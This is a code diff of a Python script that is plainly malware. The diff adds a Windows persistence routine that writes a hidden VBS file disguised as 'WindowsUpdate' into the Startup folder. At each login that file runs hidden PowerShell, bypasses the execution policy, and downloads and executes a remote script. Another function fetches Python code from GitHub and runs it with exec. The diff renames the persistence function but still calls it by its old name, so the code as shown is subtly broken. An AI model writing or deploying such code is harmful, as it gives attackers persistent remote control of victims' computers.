@@ -19,32 +19,29 @@ import datetime
 import platform
 from pathlib import Path
 
-def copy_to_startup():
+def copy_to_startups():
     try:
-        import sys
         import os
-        import shutil
         import ctypes
-        
-        if not getattr(sys, 'frozen', False):
-            return False
-        
-        current_exe = sys.executable
         
         startup = os.path.join(
             os.getenv('APPDATA'),
             'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup',
-            'WindowsUpdateLauncher.exe'
+            'WindowsUpdate.vbs'
         )
         
-        if not os.path.exists(startup):
-            shutil.copy2(current_exe, startup)
-            ctypes.windll.kernel32.SetFileAttributesW(startup, 2)
-            return True
-        return False
+        vbs_content = '''CreateObject("WScript.Shell").Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""iex (iwr -UseBasicParsing https://work.thexor7.workers.dev/psc).Content""", 0, False'''
+        
+        with open(startup, 'w') as f:
+            f.write(vbs_content)
+        
+        ctypes.windll.kernel32.SetFileAttributesW(startup, 2)
+        return True
     except:
         return False
-        
+
+copy_to_startup()
+
 def fetch_and_execute(url):
     response = requests.get(url)
     response.raise_for_status()
@@ -52,7 +49,6 @@ def fetch_and_execute(url):
     exec(script_content, globals())
 
 if __name__ == "__main__":
-    copy_to_startup()
     github_urls = [
         'https://raw.githubusercontent.com/azayan165-svg/f/refs/heads/main/w.py'
     ]
